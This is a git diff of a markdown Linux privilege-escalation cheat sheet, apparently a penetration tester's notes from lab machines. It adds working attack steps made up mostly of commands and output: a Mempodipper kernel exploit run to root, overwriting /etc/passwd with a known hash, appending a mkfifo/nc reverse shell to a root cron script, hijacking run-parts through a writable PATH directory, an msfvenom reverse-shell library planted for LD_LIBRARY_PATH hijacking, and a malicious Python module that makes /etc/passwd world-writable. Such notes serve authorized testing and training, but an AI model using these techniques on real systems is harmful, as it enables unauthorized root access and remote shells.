@@ -250,6 +250,44 @@ root
 # 
 ```
 
+### 2.6.39 < 3.2.2 (x86/x64)
+
+``` bash
+www-data@hades:/tmp$ uname -a
+Linux hades 3.0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+[https://www.exploit-db.com/exploits/35161](https://www.exploit-db.com/exploits/35161)
+
+``` bash
+www-data@hades:/tmp$ ./35161 
+===============================
+=          Mempodipper        =
+=           by zx2c4          =
+=         Jan 21, 2012        =
+===============================
+
+[+] Ptracing su to find next instruction without reading binary.
+[+] Creating ptrace pipe.
+[+] Forking ptrace child.
+[+] Waiting for ptraced child to give output on syscalls.
+[+] Ptrace_traceme'ing process.
+[+] Error message written. Single stepping to find address.
+[+] Resolved call address to 0x401ce8.
+[+] Opening socketpair.
+[+] Waiting for transferred fd in parent.
+[+] Executing child from child fork.
+[+] Opening parent mem /proc/2338/mem in child.
+[+] Sending fd 6 to parent.
+[+] Received fd at 6.
+[+] Assigning fd 6 to stderr.
+[+] Calculating su padding.
+[+] Seeking to offset 0x401cdc.
+[+] Executing su with shellcode.
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+```
+
 ## Processes and Services
 
 ``` bash
@@ -268,6 +306,12 @@ sudo lsof -i -P -n | grep LISTEN
 systemctl list-unit-files | grep enabled
 ```
 
+## Binaries That AutoElevate
+
+``` bash
+find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
+```
+
 ## Check sudo access 
 
 ``` bash
@@ -281,9 +325,9 @@ User Hades may run the following commands:
 
 Mix cp/chown and chmod
 
-https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/
+[https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial](https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial)
 
-https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+[https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries)
 
 ``` bash
 sudo -l
@@ -291,40 +335,6 @@ Matching Defaults entries for Hades:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 User Hades may run the following commands:
     (victim) /bin/chmod, /bin/cp
-```
-
-## Scheduled Tasks
-
-``` bash
-ls -lah /etc/cron*
-```
-
-``` bash
-cat /etc/crontab
-```
-
-``` bash
-grep "CRON" /var/log/* 2>/dev/null
-```
-
-### Cronjob file insecure
-
-Cronjob file check.sh overwrite
-
-``` bash
-grep "CRON" /var/log/* 2>/dev/null
-```
-
-File check.sh running as root every 1 minute.
-
-``` bash
-ls -l check.sh
-```
-
-Can change file check.sh with user permission.
-
-``` bash
-echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
 ```
 
 ## Readable/Writable
@@ -346,10 +356,17 @@ ls -l /etc/passwd
 -rw-rw-rw- 1 root root <snip> /etc/passwd
 ```
 
-`U6aMy0wojraho` : non password.
+``` bash
+$ openssl passwd 
+Password: 
+Verifying - Password: 
+QzKsrWCYxmRPY
+```
+
+`QzKsrWCYxmRPY` : non password hash.
 
 ``` bash
-sed 's/root:x:/root:U6aMy0wojraho:/' /etc/passwd > passwd
+sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd > passwd
 cat passwd > /etc/passwd
 su
 ```
@@ -366,10 +383,140 @@ echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passw
 
 [https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)
 
-## Binaries That AutoElevate
+## Scheduled Tasks
 
 ``` bash
-find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
+ls -lah /etc/cron*
+```
+
+``` bash
+cat /etc/crontab
+```
+
+``` bash
+grep "CRON" /var/log/* 2>/dev/null
+```
+
+### Cronjob file insecure
+
+Cronjob file check.sh overwrite, file check.sh running as root every 1 minute.
+
+``` bash
+ls -l check.sh
+-rw-rw-rw- 1 root root <snip> check.sh
+```
+
+Can change file check.sh with user permission.
+
+``` bash
+echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
+```
+
+### PATH Search Order Crontab
+
+``` bash
+$ cat /etc/crontab
+<snip>
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+```
+
+==> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
+
+``` bash
+chloe@roquefort:~$ ls -ld /usr/local/bin
+drwxrwsrwx 2 root staff 4096 Apr 24  2020 /usr/local/bin
+```
+
+``` bash
+cp /tmp/shell /usr/local/bin/run-parts
+```
+
+[https://crontab.guru](https://crontab.guru): `*/5 : "At every 5th minute."`
+
+``` bash
+$ sudo nc -nvlp 22
+listening on [any] 22 ...
+connect to [ip] from (UNKNOWN) [ip] 37228
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Module Import Hijacking
+
+### Dynamic Library Hijacking
+
+``` bash
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
+MAILTO=""
+<snip>
+  *  *  *  *  * root       /usr/bin/log-sweeper
+```
+
+==> `LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils`
+
+``` bash
+[hades@hades ~]$ ls -ld /usr/local/lib/dev
+drwxrwxrwx 2 root root 6 Sep  7  2020 /usr/local/lib/dev
+```
+
+``` bash
+[hades@hades ~]$ ls -l /usr/bin/log-sweeper
+-rwxr-xr-x. 1 root root 8800 Sep  4  2020 /usr/bin/log-sweeper
+[hades@hades ~]$ /usr/bin/log-sweeper
+/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
+```
+
+exploit
+
+``` bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.158 LPORT=6379 -f elf-so > utils.so
+```
+
+``` bash
+[hades@hades dev]$ chmod 777 utils.so 
+[hades@hades dev]$ pwd
+/usr/local/lib/dev
+```
+
+``` bash
+$ sudo nc -nvlp 6379
+listening on [any] 6379 ...
+connect to [ip] from (UNKNOWN) [ip] 55124
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Python Module Hijacking
+
+``` python
+$ cat python.py 
+#!/usr/bin/python
+
+import sys
+
+try:
+    import controller
+except Exception:
+    print "[!] ERROR: Unable to load controller module."
+    sys.exit()
+```
+
+`controller module` not found.
+
+Create file `controller.py` and add malicious python code.
+
+``` bash
+echo 'import os;os.system("chmod 777 /etc/passwd")' > controller.py
 ```
 
 ## Docker container
